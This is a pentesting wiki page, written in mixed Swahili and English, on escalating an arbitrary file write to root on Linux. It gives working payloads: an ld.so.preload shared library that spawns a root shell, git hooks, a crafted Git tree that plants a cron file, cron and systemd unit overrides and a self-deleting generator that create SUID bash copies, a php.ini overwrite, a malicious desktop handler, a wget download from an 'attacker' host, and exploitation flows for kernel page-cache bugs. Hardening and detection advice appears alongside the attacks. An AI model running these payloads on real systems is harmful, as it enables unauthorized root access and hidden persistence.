# Kuandika Faili Yoyote kwa Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` ni orodha ya system-wide ya shared objects ambazo dynamic linker hupakia kabla ya shared objects nyingine. Secure-execution mode huweka vizuizi vya ziada kwenye preloading, kwa hivyo library path kama `/tmp/pe.so` si mbinu ya SUID-binary inayofanya kazi kila mahali.\
Ikiwa unaweza kuunda au kuibadilisha, process inayopakia faili hiyo itapakia library iliyoorodheshwa kabla ya shared objects zake nyingine, hivyo kuruhusu code execution katika context ya process hiyo.<sup>[[12]](#references)</sup>

Kwa mfano: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

**Git hooks** ni scripts zinazoweza kutekelezwa zinazoendeshwa kwa matukio katika repository, ikiwemo operesheni za commit na merge. Ikiwa **script au user mwenye privileged** anafanya vitendo hivyo na attacker anaweza **kuandika kwenye folder la `.git`**, hook inaweza kutumiwa kwa **privilege escalation**.<sup>[[13]](#references)</sup>

Kwa mfano, inawezekana **kutengeneza script** katika git repo ndani ya **`.git/hooks`** ili itekelezwe kila mara commit mpya inapoundwa:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```
### Path traversal ya privileged Git tree export

Synchronizer yenye privileges inaweza kuepuka checkout na badala yake kuorodhesha repository iliyoathiriwa na attacker kwa `git ls-tree`, kusoma kila blob kwa `git cat-file`, kuunganisha pathname iliyoripotiwa na staging directory, kisha kuiandika yenyewe. Hali hii huwa **arbitrary file write yenye privileges za synchronizer** inapounganisha `-c safe.directory=*` (ikizima ulinzi wa Git wa repository yenye owner tofauti) bila destination containment check. Jina la tree-entry lililo absolute hufanya Python's `os.path.join(stage, name)` iondoe `stage`; jina la relative lenye `../` hutoka nje wakati filesystem inalitatua. Kwa sababu application huunda raw tree badala ya kuiomba Git ifanye checkout, pathname rejection ya wakati wa checkout hailindi sink.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

Tafuta code shape hii katika root services, timers, deployment agents, template importers, na backup/restore jobs:<sup>[[30]](#references)</sup>
```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
target = os.path.join(stage_root, git_path)  # no containment check
os.makedirs(os.path.dirname(target), exist_ok=True)
with open(target, "wb") as output:
output.write(git("cat-file", "blob", oid))
```
Ingizo la tree husimbwa kama `<mode> SP <name> NUL <raw object ID>`. Chaguo la `git hash-object --literally` huruhusu kwa makusudi data ya object ambayo uchanganuzi wa kawaida au `git fsck` inaweza kukataa, hivyo clone ya muda inaweza kuunda tree ambayo jina la faili lake ni destination kamili. Mfano huu huunda blob ya faili ya cron, huifunga tree iliyoundwa kwenye commit, na kuhamisha branch kuielekea; exploitation bado inahitaji ruhusa ya kusasisha repository inayotumiwa na job yenye privileges na Git server inayokubali object iliyoharibika.<sup>[[30]](#references)[[31]](#references)</sup>
```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```
Hardening lazima ihusishe ingestion ya repository na operesheni ya mwisho ya filesystem:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- Badilisha `safe.directory=*` kwa repositories halisi ambazo service lazima iziamini, na endesha uchakataji wa repository bila privileges za root inapowezekana.
- Kataa majina ya absolute na component yoyote ya `.` au `..` kabla ya materialization. Baada ya kuunganisha, canonicalize na uthibitishe kwamba destination bado iko chini ya root iliyokusudiwa.
- Epuka symlink races za check-then-open: fungua relative kwa trusted directory descriptor na, kwenye Linux, tumia `openat2()` pamoja na `RESOLVE_BENEATH` na `RESOLVE_NO_SYMLINKS` kwa paths zinazodhibitiwa na attacker.
- Pendelea checkout ya kawaida katika directory iliyotengwa badala ya kuunda upya checkout kutoka kwa plumbing output. Ikiwa raw-object ingestion inahitajika, wezesha validation ya upande wa receive kama `receive.fsckObjects=true`; usipunguze findings za pathname zinazohusiana na `receive.fsck.*` zinazohitajika kukataa trees zilizoundwa kwa hila.

### Cron na Faili za Muda

Ikiwa unaweza **kuandika files zinazohusiana na cron ambazo root huzitekeleza**, kwa kawaida unaweza kupata code execution wakati job itakapoendesha tena. Targets zinazovutia ni pamoja na:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Crontab ya root katika `/var/spool/cron/` au `/var/spool/cron/crontabs/`
- Timers za `systemd` na services zinazoanzishwa nazo

Ukaguzi wa haraka:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Njia za kawaida za matumizi mabaya:

- **Ongeza kazi mpya ya root ya cron** kwenye `/etc/crontab` au faili iliyo katika `/etc/cron.d/`
- **Badilisha script** ambayo tayari inaendeshwa na `run-parts`
- **Weka backdoor kwenye timer target iliyopo** kwa kurekebisha script au binary inayozinduliwa

Mfano wa minimal cron payload:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Ikiwa unaweza kuandika tu ndani ya saraka ya cron inayotumiwa na `run-parts`, weka faili inayoweza kutekelezwa humo badala yake:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Vidokezo:

- `run-parts` kwa kawaida hupuuza majina ya faili yaliyo na nukta, kwa hivyo tumia majina kama `backup` badala ya `backup.sh`.<sup>[[15]](#references)</sup>
- Baadhi ya systems hutumia timers za `systemd` badala ya cron ya kawaida, lakini wazo la abuse ni lilelile: **badilisha kile ambacho root ata-execute baadaye**.<sup>[[20]](#references)</sup>

### Faili za Service na Socket

Ikiwa unaweza kuandika **faili za unit za `systemd`** au faili zinazorejelewa nazo, unaweza kupata code execution kama root kwa kureload na ku-restart unit, au kwa kusubiri service/socket activation path i-trigger.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Targets zinazovutia ni pamoja na:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in overrides katika `/etc/systemd/system/<unit>.d/*.conf`
- Service scripts/binaries zinazorejelewa na `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Njia za `EnvironmentFile=` zinazoweza kuandikwa na kupakiwa na service inayoendeshwa kama root

Ukaguzi wa haraka:
```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```
Njia za kawaida za abuse:

- **Overwrite `ExecStart=`** katika service unit inayomilikiwa na root ambayo unaweza ku-modify
- **Add a drop-in override** yenye `ExecStart=` hasidi na u-clear ya zamani kwanza
- **Backdoor script/binary** ambayo tayari imereferiwa na unit
- **Hijack socket-activated service** kwa ku-modify faili inayolingana ya `.service` ambayo huanza socket inapopokea connection

Mfano wa malicious override:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Mtiririko wa kawaida wa kuwezesha:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Ikiwa huwezi kuanzisha tena services mwenyewe lakini unaweza kuhariri unit iliyoamilishwa na socket, huenda ukahitaji tu **kusubiri connection ya client** ili kuanzisha execution ya service yenye backdoor kama root.<sup>[[17]](#references)</sup>

### systemd generator directories

**System generators** ni executables zinazoanzishwa na system manager kabla haijapakia unit files, wakati wa boot na configuration reloads. Kwa hivyo, write access kwenye system-generator directory (au kwenye executable generator iliyopo) ni primitive ya moja kwa moja ya root-code-execution ambayo ni rahisi kukosa wakati audit inakagua faili za `*.service` na `*.timer` pekee.<sup>[[35]](#references)[[36]](#references)</sup>

Mpangilio wa kawaida wa utafutaji ni `/run/systemd/system-generators/`, `/etc/systemd/system-generators/`, `/usr/local/lib/systemd/system-generators/`, na `/usr/lib/systemd/system-generators/` (baadhi ya distributions huonyesha `/lib/systemd/system-generators/` kupitia `/usr` merge). Executable yenye jina lilelile kwenye directory ya mapema huficha ile ya baadaye. Usichanganye hizi **input executable directories** na `/run/systemd/generator`, `/run/systemd/generator.early`, na `/run/systemd/generator.late`, ambazo zina transient unit output inayotengenezwa na generators.<sup>[[35]](#references)</sup>

Ukaguzi wa haraka:
```bash
for d in /run/systemd/system-generators /etc/systemd/system-generators \
/usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
/lib/systemd/system-generators; do
[ -e "$d" ] || continue
namei -l "$d"
find "$d" -maxdepth 1 -writable -ls 2>/dev/null
getfacl -p "$d" "$d"/* 2>/dev/null
done
```
Generator iliyoundwa hivi karibuni lazima iwekwe executable bit. Ikiwa write primitive inadhibiti bytes lakini si mode, lenga generator ambayo tayari ni executable; kuifupisha (truncate) ikiwa mahali pake kwa kawaida huhifadhi metadata yake. Ikiwa directory yenyewe inaweza kuandikwa, unda entry mpya na uiweke executable.<sup>[[35]](#references)</sup>
```bash
cat > /etc/systemd/system-generators/zz-update <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown 0:0 /tmp/rootbash
chmod 4755 /tmp/rootbash
rm -f "$0"
EOF
chmod 755 /etc/systemd/system-generators/zz-update
```
Kuchochea `systemctl daemon-reload` dhidi ya **system** manager kunahitaji authorization inayofaa, lakini huendesha tena kila system generator; vinginevyo subiri reload yenye privilege, package operation, au reboot. User-generator directories kama `~/.config/systemd/user-generators/` hutekelezwa chini ya user manager na zenyewe **hazitoi** root.<sup>[[35]](#references)</sup>

Kwa hardening na hunting, thibitisha kila path component na ACL badala ya kuangalia mode bits za mwisho pekee, weka baseline ya hashes/package ownership ya generators, na toa alert kuhusu mabadiliko ya create, rename, content, au permission katika system-generator input directories zote. Kufuatilia write ni muhimu kwa sababu one-shot generator inaweza kujifuta baada ya execution, huku generated unit tree iliyo chini ya `/run/systemd/generator*` ikijengwa upya kwenye reload inayofuata.<sup>[[35]](#references)[[36]](#references)</sup>

### Overwrite a restrictive `php.ini` used by a privileged PHP sandbox

Baadhi ya custom daemons huthibitisha PHP inayotolewa na user kwa kuendesha `php` ikiwa na **restricted `php.ini`** (kwa mfano, `disable_functions=exec,system,...`). Ikiwa sandboxed code bado ina **write primitive** yoyote (kama `file_put_contents`) na unaweza kufikia **exact `php.ini` path** inayotumiwa na daemon, unaweza **overwrite hiyo config** ili kuondoa restrictions, kisha utume payload ya pili inayotekelezwa ikiwa na elevated privileges.<sup>[[2]](#references)</sup>

Mtiririko wa kawaida:

1. Payload ya kwanza ina-overwrite sandbox config.
2. Payload ya pili inatekeleza code sasa kwa kuwa dangerous functions zimewezeshwa tena.

Mfano mdogo (badilisha path inayotumiwa na daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Ikiwa daemon inaendeshwa kama root (au inathibitisha kwa kutumia paths zinazomilikiwa na root), utekelezaji wa pili hutoa root context. Hii kimsingi ni **privilege escalation via config overwrite** wakati sandboxed runtime bado inaweza kuandika files.

### Overwrite schema handlers (kama http: au https:)

`binfmt_misc` hufichua registrations chini ya `/proc/sys/fs/binfmt_misc`; kila registration huhusisha file-type pattern na interpreter. Athari ya privilege hutegemea ni nani anayeweza kubadilisha registration na ni process gani baadaye hutekeleza file inayolingana, kwa hivyo thibitisha mahitaji hayo kabla ya kuichukulia kama njia ya privilege escalation.<sup>[[21]](#references)</sup>

Desktop environments hutumia MIME associations na desktop entries kuchagua application kwa URI schemes; attacker anayeweza kuandika configuration inayohusika ya per-user pamoja na directories za desktop-entry anaweza kuelekeza schemes hizo kwenye launcher anayoidhibiti. Kwa kurekebisha file ya `$HOME/.config/mimeapps.list` ili kuelekeza HTTP na HTTPS URL handlers kwenye file hasidi (kwa mfano, `x-scheme-handler/http=evil.desktop` na `x-scheme-handler/https=evil.desktop`), click ya mtumiaji inaweza kuendesha desktop entry hiyo.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>
```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```
### Root inaendesha scripts/binaries zinazoweza kuandikwa na mtumiaji

Ikiwa workflow yenye privileged inaendesha kitu kama `/bin/sh /home/username/.../script` (au binary yoyote iliyo ndani ya directory inayomilikiwa na user asiye na privileged), unaweza kuiteka:<sup>[[1]](#references)</sup>

- **Tambua utekelezaji:** fuatilia processes kwa kutumia pspy ili kunasa root ikiita paths zinazodhibitiwa na user.<sup>[[25]](#references)</sup>
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Thibitisha uwezo wa kuandika:** hakikisha faili lengwa na directory yake vinamilikiwa na mtumiaji wako na vinaweza kuandikwa.
- **Hijack target:** hifadhi nakala ya binary/script ya awali na weka payload inayounda SUID shell (au kitendo kingine chochote cha root), kisha rejesha permissions:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Anzisha privileged action** (kwa mfano, kubonyeza kitufe cha UI kinachozindua helper). Root anapotekeleza tena path iliyotekwa, pata shell iliyopandishwa kwa `./rootshell -p`.

### Marekebisho ya privileged binaries kwenye page cache pekee

Baadhi ya kernel bugs hazibadilishi file **kwenye disk**. Badala yake, zinakuruhusu kurekebisha tu **nakala ya page cache** ya file linaloweza kusomeka. Ukiweza kulenga binary yenye **setuid** au file nyingine inayotekelezwa na **root**, execution inayofuata inaweza kuendesha bytes zinazodhibitiwa na attacker kutoka kwenye memory na kupandisha privileges, ingawa file hash iliyo kwenye disk haijabadilika.<sup>[[3]](#references)[[4]](#references)</sup>

Ni muhimu kufikiria hili kama **runtime-only file write primitive**:<sup>[[3]](#references)</sup>

- **Disk inabaki safi**: inode na bytes zilizo kwenye disk hazibadiliki
- **Memory inakuwa dirty**: processes zinazosoma au kuendesha cached page hupata content iliyorekebishwa na attacker
- **Athari ni ya muda**: mabadiliko hutoweka baada ya reboot au cache eviction

Primitive hii iko kati ya **arbitrary file write** ya kawaida na bugs za zamani za **page-cache abuse** kama Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>

- Dirty COW ilitegemea race
- Dirty Pipe ilikuwa na vikwazo vya write-position
- Page-cache-only primitive inaweza kuwa ya kuaminika zaidi ikiwa vulnerable path inatoa writes za moja kwa moja kwenye cached file-backed pages

#### Generic privesc flow

1. Pata kernel primitive inayoweza kuandika kwenye **file-backed page cache pages**
2. Itumie dhidi ya **readable privileged binary** au file nyingine inayotekelezwa na root
3. Anzisha execution **kabla** page haijaondolewa kwenye cache
4. Pata code execution kama root wakati file iliyo kwenye disk bado inaonekana haijabadilishwa

Malengo yenye thamani kubwa kwa kawaida:

- Binaries za **setuid-root**
- Helpers zinazozinduliwa na **root services**
- Binaries zinazotekelezwa mara kwa mara kutoka kwenye **containers zinazoshiriki host kernel/page cache**

#### AF_ALG + `splice()` example path

Copy Fail (CVE-2026-31431) ni mfano mzuri wa aina hii. Vulnerable path ilikuwa kwenye Linux crypto userspace API (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` inaweza kuhamisha references za page-cache pages kutoka kwenye file linaloweza kusomeka kwenda kwenye crypto TX scatterlist
- in-place `algif_aead` decrypt path ilitumia tena source na destination buffers
- `authencesn` kisha iliandika kwenye destination tag region
- region hiyo ilipokuwa bado inarejelea spliced file-backed pages, write iliingia kwenye **page cache ya target file**

Kwa hiyo, technique ya kuvutia si CVE yenyewe, bali ni pattern hii:

- **ingiza file-backed cache pages kwenye kernel subsystem**
- ifanye subsystem **izichukulie kama writable output**
- anzisha overwrite ndogo inayodhibitiwa kwenye memory

Public PoC ilitumia **4-byte writes** zinazorudiwa kurekebisha `/usr/bin/su` kwenye memory, kisha ikaitekeleza.<sup>[[4]](#references)[[7]](#references)</sup>

#### ESP / XFRM + netfilter TEE clone example path

DirtyClone (CVE-2026-43503) inaonyesha variant nyingine ya pattern hiyo hiyo ya **page-cache-only write-to-root**, lakini wakati huu sink ni **IPsec ESP decrypt** badala ya `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

Technique muhimu hapa ni hatua ya **metadata-laundering**:

- `splice()` huweka **read-only file-backed page-cache page** kwenye packet ya ESP-in-UDP
- mitigation ya awali ya DirtyFrag iliweka tag `SKBFL_SHARED_FRAG` kwenye skb ili `esp_input()` ifanye **copy kabla ya decrypting**
- netfilter `TEE` hu-duplicate packet kupitia `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- clone huhifadhi **physical page-cache reference ileile** lakini inapoteza `SKBFL_SHARED_FRAG`
- `esp_input()` kisha huichukulia clone kuwa salama na huendesha **in-place `cbc(aes)` decrypt** juu ya file-backed page

Kwa hiyo, somo kwa reviewer ni pana zaidi ya CVE: ikiwa mitigation inategemea **skb/page metadata** kuamua kama operation lazima ifanye copy kwanza, **clone/copy path** yoyote inayohifadhi backing page lakini kuondoa metadata inaweza kufungua tena write primitive bila kuonekana.

Typical exploitation flow:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` ili kupata **`CAP_NET_ADMIN` ndani ya private network namespace**
2. inua loopback na uweke **netfilter `TEE` rule** kwenye `mangle/OUTPUT`
3. weka **XFRM ESP transport SAs** kupitia `NETLINK_XFRM`
4. encode kila target 4-byte word kwenye SA `seq_hi` field (DirtyFrag's word-selection trick)
5. tuma spliced ESP-in-UDP packet ili **TEE clone** ifikie `esp_input()` na ifanye decrypt **in place**
6. rudia hadi page-cache copy ya `/usr/bin/su` au executable nyingine yenye privileges iwe na attacker-controlled code

Kiutendaji, impact ni sawa na mfano wa `AF_ALG`: file iliyo kwenye disk inabaki safi, lakini `execve()` hutumia **mutated page-cache bytes** na kutoa root.<sup>[[8]](#references)[[9]](#references)</sup>

Useful exposure checks kwa variant hii:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
Kupunguza attack surface kwa muda mfupi pia kunategemea path hapa: kuboresha hadi kernel yenye `48f6a5356a33` hurekebisha clone path, huku kuzuia autoload ya `xt_TEE` kukiondoa **flag-laundering step** na kuzuia `esp4` / `esp6` kukiondoa **decrypt sink**.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Exposure na hunting

Ikiwa unashuku aina hii ya bug, usitegemee tu ukaguzi wa disk integrity. Pia thibitisha:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
Thamani za configuration zilizo hapa chini zinatofautisha interface inayoweza kupakiwa na ile iliyojengwa ndani ya kernel; sheria za crypto build huunganisha `CONFIG_CRYPTO_USER_API_AEAD` na `algif_aead`.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` inaweza kupakiwa/kupakuliwa kama module
- `CONFIG_CRYPTO_USER_API_AEAD=y`: interface imejengwa ndani ya kernel
- binaries za setuid ni targets nzuri kwa sababu patch ya page-cache-only inaweza kutosha kubadilisha local foothold kuwa root

#### Kupunguza attack surface ya njia ya `algif_aead`

Ikiwa interface iliyo hatarini inatolewa na module inayoweza kupakiwa:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Ikiwa imecompiliwa kwenye kernel, baadhi ya disclosures ziliripoti kuzuia init path kwa:<sup>[[28]](#references)</sup>
```bash
initcall_blacklist=algif_aead_init
```
Aina hii ya mitigation inafaa kukumbukwa pia kwa kernel LPE nyingine: ikiwa exploitation inategemea interface fulani ya hiari, kuzima au kuiweka kwenye blacklist kunaweza kuvunja exploit path hata kabla ya full kernel upgrade kupatikana.<sup>[[6]](#references)[[28]](#references)</sup>



## References

- [1] [HTB Bamboo – hijacking script inayotekelezwa na root katika directory ya PaperCut inayoweza kuandikwa na user](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) — FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Taarifa ya Openwall oss-security kuhusu CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Linux stable fix: crypto: algif_aead - Revert to operating out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — ushauri kuhusu CVE-2026-31431](https://copy.fail/)
- [7] [Theori / Xint technical writeup](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [DirtyClone repository / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: Kuchambua na Ku-exploit Linux LPE Variant DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Linux fix: net: skb: preserve `SKBFL_SHARED_FRAG` in `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Linux earlier mitigation: set `SKBFL_SHARED_FRAG` for spliced UDP packets (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — ukurasa wa manual wa Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — ukurasa wa manual wa Linux](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — ukurasa wa manual wa Debian](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — nyaraka za Linux Kernel](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [MIME Applications Associations](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Shared MIME-info specification](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Desktop Entry specification](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Kconfig Language](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Linux crypto Makefile](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: Linux kernel AF_ALG page cache vulnerability](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — ukurasa wa manual wa Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Nyaraka za Git `hash-object`](https://git-scm.com/docs/git-hash-object)
- [32] [Nyaraka za Git `ls-tree`](https://git-scm.com/docs/git-ls-tree)
- [33] [Nyaraka za usanidi wa Git](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — ukurasa wa manual wa Linux](https://man7.org/linux/man-pages/man2/openat2.2.html)
- [35] [Nyaraka za systemd generator](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
- [36] [Elastic Security Labs — Linux Detection Engineering: persistence mechanisms](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
{{#include ../../banners/hacktricks-training.md}}
